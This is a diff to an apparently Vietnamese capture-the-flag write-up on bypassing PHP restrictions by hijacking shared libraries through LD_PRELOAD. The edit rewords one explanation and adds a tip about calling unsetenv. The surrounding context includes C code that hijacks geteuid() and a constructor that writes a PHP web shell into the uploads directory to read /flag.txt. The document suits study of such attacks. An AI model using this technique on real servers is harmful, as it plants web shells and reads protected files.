@@ -197,7 +197,7 @@ int geteuid()
     system("ls");
 }
 ```
-Ta có thể upload 1 file thực thi(C) đóng vai trò là 1 shared library chứa chứa hàm bị hijack mà sẽ được gọi. Ví dụ khi 1 hàm nào đó như `mail()` sẽ gọi đến `geteuid()`. Và vì thế, chỉ có thể exploit khi mà `mail()` được gọi.
+Ta có thể upload 1 file compiled code C đóng vai trò là 1 shared library chứa chứa hàm bị hijack mà sẽ được gọi. Ví dụ khi 1 hàm nào đó như `mail()` sẽ gọi đến `geteuid()`. Và vì thế, chỉ có thể exploit khi mà `mail()` được gọi.
 
 2. Cách hai `hijack shared library`:
 ```c
@@ -222,6 +222,7 @@ __attribute__ ((__constructor__)) void angel (void){
     system("echo \"<?php system('cat /flag.txt'); ?>\" > /var/www/html/uploads/devme.php");
 }
 ```
+Ở đây ta cần `unsetenv` trước khi vào hàm `system()` nhằm tránh lỗi
 
 `exploit.py`:
 ```python
